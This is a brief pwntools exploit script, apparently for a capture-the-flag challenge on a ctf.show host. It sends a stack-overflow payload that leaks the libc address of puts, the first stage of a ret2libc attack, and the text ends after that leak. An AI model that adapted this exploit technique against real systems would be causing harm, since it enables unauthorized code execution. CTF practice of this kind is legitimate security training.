from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28133)
elf = ELF('./pwn')
main = elf.sym['main']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload = cyclic(0x6b+4) + p32(puts_plt) + p32(main) + p32(puts_got)
io.recvuntil('O.o?')
io.sendline(payload)
puts = u32(io.recvuntil('\xf7')[-4:])
